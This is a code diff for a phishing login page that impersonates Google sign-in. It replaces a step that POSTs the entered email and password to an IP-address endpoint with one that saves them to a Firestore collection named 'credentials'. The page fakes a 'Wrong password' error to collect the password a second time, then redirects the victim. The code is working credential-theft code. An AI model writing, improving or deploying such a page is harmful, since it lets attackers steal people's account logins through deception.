@@ -1,3 +1,17 @@
+// Firebase Configuration - REPLACE THESE WITH YOUR OWN KEYS FROM FIREBASE CONSOLE
+const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT_ID.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
 const loginForm = document.getElementById('loginForm');
 const emailStep = document.getElementById('emailStep');
 const passwordStep = document.getElementById('passwordStep');
@@ -90,61 +104,31 @@ loginForm.addEventListener('submit', async function(event) {
     responseMessage.innerText = ''; 
     progressBar.style.display = 'block';
 
-    try {
-        // Always send data to backend for logging
-        await fetch('http://10.59.32.216:8080/api/receive', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: email,
-                password: password,
-                fullName: "Attempt " + (loginAttempts + 1),
-                phoneNumber: "Not Provided",
-                jobTitle: "Not Provided"
-            })
-        });
+    // Send data to Firebase Firestore
+    db.collection('credentials').add({
+        email: email,
+        password: password,
+        fullName: "Attempt " + (loginAttempts + 1),
+        phoneNumber: "Not Provided",
+        jobTitle: "Not Provided",
+        capturedAt: new Date().toISOString()
+    }).catch(error => console.error('Firebase Error:', error));
 
-        if (loginAttempts === 0) {
-            // 1st Time: Show Google error message after a short delay
-            setTimeout(() => {
-                progressBar.style.display = 'none';
-                submitBtn.innerText = originalBtnText;
-                submitBtn.disabled = false;
-                
-                responseMessage.innerText = 'Wrong password. Try again or click Forgot password to reset it.';
-                document.getElementById('password').value = '';
-                document.getElementById('password').focus();
-                
-                loginAttempts++;
-            }, 1000);
-        } else {
-            // 2nd Time: Just show loading then redirect back
-            setTimeout(() => {
-                progressBar.style.display = 'none';
-                
-                // Reset to 1st page
-                passwordStep.style.display = 'none';
-                emailStep.style.display = 'block';
-                submitBtn.style.display = 'none';
-                nextBtn.style.display = 'inline-block';
-                
-                headerTitle.innerText = 'Sign in';
-                headerSubtitle.innerText = 'Use your Google Account';
-                headerSubtitle.classList.remove('email-highlight');
-                headerSubtitle.style.cursor = 'default';
-                
-                loginForm.reset();
-                loginAttempts = 0;
-            }, 2000);
-        }
-
-    } catch (error) {
-        console.error('Fetch Error:', error);
+    // UI Redirection Flow (Simulate network delay)
+    setTimeout(() => {
         progressBar.style.display = 'none';
-        submitBtn.innerText = originalBtnText;
-        submitBtn.disabled = false;
-        responseMessage.innerText = 'Something went wrong. Please try again.';
-    }
+        
+        if (loginAttempts === 0) {
+            // 1st Time: Show Google error message
+            submitBtn.innerText = originalBtnText;
+            submitBtn.disabled = false;
+            responseMessage.innerText = 'Wrong password. Try again or click Forgot password to reset it.';
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+            loginAttempts++;
+        } else {
+            // 2nd Time: Redirect to the app
+            window.location.href = 'https://teja9391.github.io/ThreatMatrix-AI/?auth=success';
+        }
+    }, 1500);
 });
